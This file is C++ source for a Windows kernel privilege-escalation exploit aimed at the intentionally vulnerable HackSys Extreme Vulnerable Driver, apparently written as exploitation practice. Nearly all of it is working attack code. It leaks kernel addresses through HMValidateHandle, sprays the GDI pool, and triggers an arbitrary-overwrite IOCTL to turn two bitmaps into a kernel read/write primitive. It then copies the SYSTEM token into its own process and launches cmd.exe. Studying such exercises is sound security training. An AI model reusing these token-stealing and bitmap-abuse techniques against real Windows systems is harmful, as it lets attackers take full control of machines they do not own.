

#pragma once
#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <cstdint>

#pragma comment(lib, "Gdi32.lib")

#include <Wingdi.h>

#define hDev "\\\\.\\HacksysExtremeVulnerableDriver"

//using namespace System;
//using namespace System::Runtime::InteropServices;

typedef void*(NTAPI *lHMValidateHandle)(
	HWND h,
	int type
);

int g = 1;

HBITMAP managerBitmap;
HBITMAP workerBitmap;

//unsigned long long mpvscan0;
//unsigned long long wpvscan0;


/*
typedef struct _HEAD
{
HANDLE h;
DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
HEAD h;
PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;

typedef struct _THRDESKHEAD
{
THROBJHEAD h;
PVOID    rpdesk;
PVOID       pSelf;
} THRDESKHEAD, *PTHRDESKHEAD;
*/

LRESULT
CALLBACK MainWProc(
	HWND hWnd, UINT uMsg,
	WPARAM wParam, LPARAM lParam
)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

lHMValidateHandle pHmValidateHandle = NULL;

// https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
BOOL
GetHMValidateHandle(
)
{
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xe8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

PUCHAR
GetNtos(
)
{
	// defines.
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PVOID Nt = NULL;

	// Dynamic import.
	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	// Requere Medium integrity level ( > win7 ),
	// if run from low il, then return NULL.
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) { return NULL; }
	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
	Nt = ModuleInfo->Module[0].ImageBase;

	// No longer needed, free the memory.
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	return (PUCHAR)Nt;
}

DWORD64
GetPsInitialSystemProcess(
)
{
	PUCHAR NtBaddr = (PUCHAR)GetNtos();
	printf("[+] ntoskrnl Base Addr: %p\n", NtBaddr);
	PUCHAR ntos = (PUCHAR)LoadLibrary(L"ntoskrnl.exe");
	PUCHAR addr = (PUCHAR)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	auto Psi = addr - ntos + NtBaddr;
	printf("[+] PsInitialSystemProcess: %p\n", Psi);
	return (DWORD64)Psi;
}

ATOM
RegisterhWnd(
	LPCWSTR class_name,
	LPCWSTR menu_name
	)
{
	WNDCLASS wind_class = WNDCLASS();
	wind_class.lpszClassName = class_name;
	wind_class.lpszMenuName = menu_name;
	wind_class.lpfnWndProc = MainWProc;
	return RegisterClassW(&wind_class);
}

void
DestroyWnd(
	HWND hWnd
	) 
{
	DestroyWindow(hWnd);
	UnregisterClassW(L"aaa",NULL);
}

HWND
CreateWindowObject(
	) 
{
	WCHAR* Buff = new WCHAR[0x8F0];
	RtlSecureZeroMemory(Buff, 0x8F0);
	RtlFillMemory(Buff, 0x8F0, '\x41');
	ATOM Cls = RegisterhWnd(L"aaa" ,Buff);
	return CreateWindowExW(0, L"aaa", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
}

DWORD64
LeaklpszMenuName(
	HWND hWnd
	) 
{
	DWORD64 pCLSOffset = 0xa8;
	DWORD64 lpszMenuNameOffset = 0x90;
	BOOL bRet = GetHMValidateHandle();
	uintptr_t lpUserDesktopHeapWindow = (uintptr_t)pHmValidateHandle(hWnd, 1);
	//long lpUserDesktopHeapWindow = (long)Convert::ToInt64(uWND);
	//Int64 ^ ulClientDelta = Marshal::ReadInt64((IntPtr)&uWND + 0x20) - lpUserDesktopHeapWindow;
	//printf("%p", ulClientDelta);
	//auto r = *reinterpret_cast<DWORD64 *>(lpUserDesktopHeapWindow);
	//auto t = *reinterpret_cast<DWORD64 *>((DWORD64*)lpUserDesktopHeapWindow + 0x20);
	//printf("%p\n", lpUserDesktopHeapWindow);
	//printf("%p\n", r);
	//printf("%p\n", t);
	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>(lpUserDesktopHeapWindow + 0x20) - lpUserDesktopHeapWindow;
	//printf("%p\n", ulClientDelta);
	//(DWORD64)(lpUserDesktopHeapWindow);
	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>(lpUserDesktopHeapWindow+ pCLSOffset);
	//printf("%p\n", KerneltagCLS);
	//printf("%p\n", KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
	//DWORD64 lpUserDesktopHeapWindow = *reinterpret_cast<DWORD64 *>(uWND);
	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
	//printf("%p\n", lpszMenuName);
	//int z; scanf("%d", &z);
	return lpszMenuName;
}

VOID
SprayPool(
)
{
	for (int i = 0; i <= 200; i++) {
		HWND TestWindowHandle = CreateWindowObject();
		auto Curr = LeaklpszMenuName(TestWindowHandle);
		DestroyWnd(TestWindowHandle);
	}
}

DWORD64 
Leak(
	int y
	)
{
	if (y == 0) {
		SprayPool();
	}
	
	DWORD64 Curr, Prev = NULL;

	for (int i = 0; i <= 20; i++) {
		HWND TestWindowHandle = CreateWindowObject();
		Curr = LeaklpszMenuName(TestWindowHandle);
		if (1<=i) {
			if (Curr == Prev) {
				DestroyWnd(TestWindowHandle);
				WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
				RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
				RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
				if (y == 0) {
					managerBitmap = CreateBitmap(0x701, 2, 1, 8, Buff);
				}
				else {

					workerBitmap = CreateBitmap(0x701, 2, 1, 8, Buff);
				}
				break;
			}
		}
		DestroyWnd(TestWindowHandle);
		Prev = Curr;
	}
	//printf("%p, %p\n", Prev , Curr);
	auto pvscan0 = Prev + 0x50;

	//printf("%p\n", pvscan0);
	//int g;
	//scanf("%d", &g);
	return pvscan0;
}

DWORD64
BitmapRead(
	HBITMAP Mgr,
	HBITMAP Wrk,
	DWORD64 addr
)
{

	printf("reading addr at: %p\n", addr);
	LPVOID bRet = VirtualAlloc(
		0, 0x8,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	SetBitmapBits(Mgr, 0x8, (void *)(&addr));

	if (GetBitmapBits(Wrk, 0x8, &bRet) == NULL) {
		printf("err");
		//
		//exit(GetLastError());
	}
	return *reinterpret_cast<DWORD64 *>(bRet);

}

DWORD64 
BitmapWrite(
	HBITMAP Mgr,
	HBITMAP Wrk,
	DWORD64 addr,
	DWORD64 Val
	) 
{
	
	SetBitmapBits(Mgr, 8, (void *)(&addr));
	if (SetBitmapBits(Wrk, 8, (void *)(&Val)) == 0) {
		return -1;
	}
}

int
main(
)
{

	

	//auto bRet = GetHMValidateHandle();
	//if (!bRet) {
	//	exit( GetLastError() );
	//}

	printf("\n[!] gdi feng shui ..\n");
	printf("[>] Spraying the pool\n");
	printf("[>] leaking ulClientDelta...\n");
	auto a = Leak(0);
	auto b = Leak(1);
	
	printf("\n[+] pHmValidateHandle: %p \n", pHmValidateHandle);
	printf("[+] hMgr: %p\n", &managerBitmap);
	printf("[+] hWorker: %p\n", &workerBitmap);
	printf("[+] Mgr pvScan0 offset: %p\n", a);
	printf("[+] Wrk pvScan0 offset: %p\n", b);

	LPVOID bRet = VirtualAlloc(
		0, 0x8,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	//SetBitmapBits(managerBitmap, 0x8, (void *)(&addr));
	BYTE src[8] = "\x41\x41\x41\x41\x41\x41\x41";
	//BYTE* dst[8] = { 0 };
	LPVOID results = VirtualAlloc(0, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	BYTE* dst = new BYTE[sizeof(ULONGLONG) * 2];
	SecureZeroMemory(dst, sizeof(ULONGLONG) * 2);

	printf("\nbretVal: %p", results);
	
	auto bi = GetBitmapBits(workerBitmap, sizeof(ULONGLONG), &results);
	
	printf("\nbretVal: %p", bi);
	printf("\nbretVal: %p", results);
	int jk;
	scanf("%d", &jk);


	//byte Buff[sizeof(LPVOID) * 2] = { 0 };
	//memcpy(Buff, &b, (sizeof(LPVOID)));
	//memcpy(Buff + (sizeof(LPVOID)), &a, (sizeof(LPVOID)));

	//LPVOID lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	//lpSourceTargetAddress = &b;

	PUCHAR chOverwriteBuffer;

	auto lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	lpSourceTargetAddress = &b;

	chOverwriteBuffer = (PUCHAR)malloc(sizeof(LPVOID) * 2);
	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, (sizeof(LPVOID)));
	memcpy(chOverwriteBuffer + (sizeof(LPVOID)), &a, (sizeof(LPVOID)));

	//char Buff[16] = {0};
	//
	//memcpy(Buff, &b, 8);
	//memcpy(Buff + 8, &a, 8);

	DWORD u = 0;

	auto dev = CreateFileA(
		hDev,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (dev == INVALID_HANDLE_VALUE) { exit(-1); }

	printf("\n[>] ldr\n");
	printf("[+] Opened Device Handle at: %p\n", &dev);
	printf("[+] Device Name: %s", hDev);
	printf("[+] Sending Ioctl: %p\n", 0x22200B);
	printf("[+] Buffer length: %d\n", sizeof(LPVOID) * 2);

	auto bResult = DeviceIoControl(
		dev,	
		0x22200B,						
		chOverwriteBuffer,					
		(sizeof(LPVOID) * 2),			
		NULL, 0,						
		&u,							
		(LPOVERLAPPED)NULL);

	if (!bResult) {
		CloseHandle(dev);
		exit(GetLastError());
	}

	CloseHandle(dev);

	//printf("System _EP: %p\n", _EP);
	//
	//auto Systoken = BitmapRead(ManagerBitmap, WorkerBitmap, (DWORD64)(
	//	&_EP + (UINT_PTR)0x358));
	//auto SysPid = BitmapRead(ManagerBitmap, WorkerBitmap, (DWORD64)(
	//	&_EP + (UINT_PTR)0x2F0));
	//printf("Systoken: %p\n", Systoken); //Systoken
	//printf("SysPid: %p", SysPid); //Systoken
	//
	//DWORD64 ActiveProcessLinksOffset = 0x2F0;
	//DWORD64 TokenOffset = 0x358;
	//DWORD64 UniqueProcessIdOffset = 0x2E8;

	printf("\n[!] running exploit...\n");

	DWORD64 _EP = GetPsInitialSystemProcess();

	DWORD64 SepPtr = BitmapRead(
		managerBitmap,
		workerBitmap,
		_EP
	);

	DWORD64 SysTokenPtr = SepPtr + 0x358;

	DWORD64 SysToken = BitmapRead(
		managerBitmap,
		workerBitmap,
		SysTokenPtr
	);


	printf("[+] System TOKEN: %p\n" , SysToken);
	int s;
	scanf("%d", &s);


	DWORD64 NextPEP = BitmapRead(
		managerBitmap,
		workerBitmap, 
		((DWORD64)SepPtr) + ((DWORD64)0x2F0)
	) - 0x2E8 - 0x8;


	DWORD64 Token = NULL;


	while (1) {

		DWORD64 NextPID = BitmapRead(
			managerBitmap,
			workerBitmap,
			((DWORD64)NextPEP + 0x2E8)
		);

		if (NextPID == GetCurrentProcessId()) {
			Token = BitmapRead(
				managerBitmap,
				workerBitmap,
				((DWORD64)NextPEP + 0x358)
			);

			printf("[+] Our token: %p\n", Token);
			break;

		}

		NextPEP = BitmapRead(
			managerBitmap,
			workerBitmap,
			((DWORD64)NextPEP + 0x2F0)
		) - 0x2E8 - 0x8;

	}


	BitmapWrite(
		managerBitmap,
		workerBitmap,
		((DWORD64)NextPEP + 0x358),
		SysToken
	);

	system("cmd.exe");
	system("pause");
	int y;
	scanf("%d", &y);
	return 0;
}
